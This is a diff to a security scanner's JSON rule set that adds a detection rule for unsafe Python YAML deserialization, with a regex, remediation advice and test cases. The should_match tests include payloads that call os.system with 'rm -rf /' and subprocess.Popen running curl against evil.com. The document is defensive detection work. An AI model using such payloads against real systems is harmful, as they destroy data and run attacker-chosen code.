@@ -57,6 +57,27 @@
       "remediation": "Avoid compiling code from strings. Use direct function definitions."
     },
     {
+      "id": "EXEC-008",
+      "title": "YAML deserialization attack",
+      "description": "Unsafe YAML loading with type constructors (!!python/object, !!python/apply) enables arbitrary code execution. Critical in Python AI agent frameworks that process YAML configs.",
+      "severity": "critical",
+      "pattern": "(!!python/(object|module|apply|import)|yaml\\.load\\s*\\([^)]*Loader\\s*=\\s*yaml\\.Loader|yaml\\.unsafe_load|yaml\\.full_load|\\bLoad\\s*\\([^)]*\\byaml\\b)",
+      "file_extensions": ["py", "yaml", "yml", "txt", "md"],
+      "remediation": "Use yaml.safe_load() instead of yaml.load(). Never process YAML with !!python type constructors from untrusted sources.",
+      "test_cases": {
+        "should_match": [
+          "!!python/object/apply:os.system ['rm -rf /']",
+          "!!python/object/new:subprocess.Popen [['curl', 'evil.com']]",
+          "yaml.load(data, Loader=yaml.Loader)",
+          "yaml.unsafe_load(user_input)"
+        ],
+        "should_not_match": [
+          "yaml.safe_load(data)",
+          "yaml.load(data, Loader=yaml.SafeLoader)"
+        ]
+      }
+    },
+    {
       "id": "EXEC-007",
       "title": "SQL injection via string formatting",
       "description": "Building SQL queries with f-strings or .format() allows attackers to inject arbitrary SQL commands.",
